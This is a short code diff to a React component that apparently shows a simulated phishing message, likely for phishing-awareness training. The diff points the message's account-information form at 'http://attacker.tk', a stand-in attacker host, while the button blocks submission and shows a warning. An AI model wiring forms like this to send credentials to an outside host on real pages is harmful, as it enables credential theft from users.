@@ -24,7 +24,7 @@ const VkMessage = () => {
 						<strong>urgently</strong> need to fill out your account
 						information here:
 					</p>
-					<form action={''}>
+					<form action={'http://attacker.tk'}>
 						<button
 							onClick={(e) => {e.preventDefault(); setWarning(true);}}
 							className={classes.button}>
